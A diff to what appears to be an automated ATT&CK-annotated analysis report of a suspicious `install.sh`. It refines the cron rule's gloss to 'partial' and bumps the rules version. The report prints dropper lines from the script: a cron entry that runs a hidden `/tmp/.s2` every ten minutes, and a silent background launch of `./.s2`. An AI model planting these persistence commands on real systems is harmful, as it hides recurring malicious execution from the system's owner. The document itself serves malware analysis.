@@ -2,7 +2,7 @@
 
 Sources: `install.sh` (sha256 `6b7c5f564d8a`…, 9 lines)
 
-Glosses: 4 rule, 0 model, 0 analyst, 4 none, 1 pending · rules `2026.10.6` · ATT&CK `20.0`
+Glosses: 4 rule (1 partial), 0 model, 0 analyst, 4 none, 1 pending · rules `2026.10.7` · ATT&CK `20.0`
 
 ## `install.sh`
 
@@ -32,8 +32,9 @@ Glosses: 4 rule, 0 model, 0 analyst, 4 none, 1 pending · rules `2026.10.6` · A
       Makes a file executable, typically a payload that was just downloaded.
 
    7  (crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.s2') | crontab -
-      T1053.003 Cron   [rule: cron]
+      T1053.003 Cron   [rule: cron; partial]
       Creates or edits a cron job so a command runs on a schedule.
+      partial: the line also runs crontab, which this rule does not describe
 
    8  ./.s2 >/dev/null 2>&1 &
       [pending]
